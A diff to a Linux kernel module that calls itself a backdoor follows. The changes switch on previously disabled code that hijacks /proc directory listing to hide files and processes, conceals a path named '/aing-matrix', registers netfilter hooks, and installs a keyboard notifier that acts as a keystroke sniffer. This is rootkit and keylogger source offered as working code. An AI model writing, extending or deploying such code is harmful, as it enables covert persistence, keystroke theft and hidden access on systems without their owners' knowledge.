@@ -609,7 +609,6 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
             return 0;
         }
     }
-#if 1
     for (i = 0; i < hidden_file_count; ++i) {
         printk(KERN_ALERT "Checking %s against %s\n", proc_name, hidden_files[i].name);
         if (strncmp(proc_name, hidden_files[i].name, strlen(hidden_files[i].name)) == 0) {
@@ -617,11 +616,13 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
             return 0;
         }
     }
-#endif
     for (i = 0; i < hidden_file_count; ++i) {
         if (ctx == &hidden_files[i].bad_ctx) {
             return hidden_files[i].backup_ctx->actor(hidden_files[i].backup_ctx, proc_name, len, off, ino, d_type);
         }
+    }
+    if (ctx == &bad_ctx) {
+        return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
     }
     return ctx->actor(ctx, proc_name, len, off, ino, d_type);
 }
@@ -631,9 +632,7 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
     int result = 0;
 
     for (i = 0; i < hidden_file_count; ++i) {
-        printk(KERN_ALERT "Pre check\n");
         if (file && file->f_inode && file->f_inode == hidden_files[i].inode) {
-            printk(KERN_ALERT "Post check\n");
             //Inodes match, use this context
             hidden_files[i].bad_ctx.pos = ctx->pos;
             hidden_files[i].backup_ctx = ctx;
@@ -641,6 +640,10 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
             ctx->pos = hidden_files[i].bad_ctx.pos;
             return result;
         }
+    }
+    if (ctx == &bad_ctx) {
+        result = backup_proc_fops->iterate_shared(file, &bad_ctx);
+        return result;
     }
     result = file->f_inode->i_fop->iterate_shared(file, ctx);
     return result;
@@ -720,14 +723,7 @@ static int __init mod_init(void) {
     alloc_pidR = (struct pid * (*) (struct pid_namespace*) ) kallsyms_lookup_name("alloc_pid");
     my_tasklist_lock = (rwlock_t*) kallsyms_lookup_name("tasklist_lock");
 
-    //Zero out the hidden file names
-    for (i = 0; i < 100; ++i) {
-        //memset(hidden_files[i], 0, 256);
-    }
-
-    //if (kern_path("/proc", 0, &proc_path)) {
-#if 0
-    if (kern_path("/", 0, &proc_path)) {
+    if (kern_path("/proc", 0, &proc_path)) {
         return -1;
     }
     proc_inode = proc_path.dentry->d_inode;
@@ -735,71 +731,12 @@ static int __init mod_init(void) {
     backup_proc_fops = proc_inode->i_fop;
     proc_fops.iterate_shared = rk_iterate_shared;
     proc_inode->i_fop = &proc_fops;
-#endif
 
     const char* user_input = "/aing-matrix";
     if (hide_file(user_input, hidden_files + hidden_file_count)) {
         ++hidden_file_count;
     }
 
-#if 0
-    //const char *user_input = "/proc/stat";
-
-    char* user_string = kmalloc(100, GFP_KERNEL);
-    strcpy(user_string, user_input);
-    char* user_file = kmalloc(100, GFP_KERNEL);
-    memset(user_file, 0, 40);
-
-    for (i = strlen(user_string) - 1; i >= 0; --i) {
-        if (user_string[i] == '/') {
-            break;
-        }
-        user_file[x++] = user_string[i];
-        user_string[i] = '\0';
-    }
-    for (i = 0; i < strlen(user_file) / 2; ++i) {
-        char tmp = user_file[i];
-        user_file[i] = user_file[strlen(user_file) - i - 1];
-        user_file[strlen(user_file) - i - 1] = tmp;
-    }
-
-    printk(KERN_INFO "Dir \"%s\"\tFile \"%s\"\n", user_string, user_file);
-
-#if 0
-    if (kern_path("/aing-matrix", 0, &my_file_path)) {
-        return -1;
-    }
-
-    memset(parent_name, 0, PATH_MAX);
-    //char *path_name = dentry_path_raw(my_file_path.dentry->d_parent, parent_name, PATH_MAX);
-    char *path_name = dentry_path_raw(my_file_path.dentry, parent_name, PATH_MAX);
-
-    //strcpy(hidden_files[hidden_file_count++], "/aing-matrix");
-    strcpy(hidden_files[hidden_file_count++], path_name);
-
-    //my_file_inode = my_file_path.dentry->d_inode;
-    my_file_inode = my_file_path.dentry->d_parent->d_inode;
-    file_ops = *my_file_inode->i_fop;
-    backup_file_ops = my_file_inode->i_fop;
-    file_ops.iterate_shared = rk_iterate_shared;
-    my_file_inode->i_fop = &file_ops;
-#else
-    if (kern_path(user_string, 0, &my_file_path)) {
-        return -1;
-    }
-    my_file_inode = my_file_path.dentry->d_inode;
-    file_ops = *my_file_inode->i_fop;
-    backup_file_ops = my_file_inode->i_fop;
-    file_ops.iterate_shared = rk_iterate_shared;
-    my_file_inode->i_fop = &file_ops;
-
-#endif
-
-    kfree(user_string);
-    kfree(user_file);
-#endif
-
-#if 0
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
     nfhi.pf = PF_INET;
@@ -835,7 +772,6 @@ static int __init mod_init(void) {
     printk(KERN_ALERT "backdoor module loaded\n");
 
     register_keyboard_notifier(&keysniffer_blk);
-#endif
     printk(KERN_ALERT "backdoor module loaded\n");
     return 0;
 }
@@ -857,23 +793,19 @@ static void __exit mod_exit(void) {
     int i;
     struct task_struct* ts;
 
-    //nf_unregister_net_hook(&init_net, &nfho);
-    //nf_unregister_net_hook(&init_net, &nfhi);
+    nf_unregister_net_hook(&init_net, &nfho);
+    nf_unregister_net_hook(&init_net, &nfhi);
 
-    //unregister_keyboard_notifier(&keysniffer_blk);
+    unregister_keyboard_notifier(&keysniffer_blk);
 
-    //proc_inode = proc_path.dentry->d_inode;
-    //proc_inode->i_fop = backup_proc_fops;
+    proc_inode = proc_path.dentry->d_inode;
+    proc_inode->i_fop = backup_proc_fops;
 
     for (i = 0; i < hidden_file_count; ++i) {
         hidden_files[i].inode = hidden_files[i].path.dentry->d_inode;
         hidden_files[i].inode->i_fop = hidden_files[i].backup_fops;
     }
 
-    //my_file_inode = my_file_path.dentry->d_inode;
-    //my_file_inode->i_fop = backup_file_ops;
-
-#if 0
     if (svc) {
         if (svc->tls_socket) {
             sock_release(svc->tls_socket);
@@ -892,16 +824,6 @@ static void __exit mod_exit(void) {
         kfree(closed_ports);
     }
 
-#if 0
-    write_lock(my_tasklist_lock);
-    for (i = 0; i < hidden_count; ++i) {
-        change_pidR(hidden_procs[i].ts, PIDTYPE_PID, hidden_procs[i].p);
-        //Decrement the refcount to reset pid struct
-        put_pid(hidden_procs[i].p);
-        force_sig(SIGKILL, hidden_procs[i].ts);
-    }
-    write_unlock(my_tasklist_lock);
-#else
     write_lock(my_tasklist_lock);
     for (i = 0; i < hidden_count; ++i) {
         for_each_process(ts) {
@@ -912,8 +834,6 @@ static void __exit mod_exit(void) {
         }
     }
     write_unlock(my_tasklist_lock);
-#endif
-#endif
     printk(KERN_ALERT "removed backdoor module\n");
 }
 
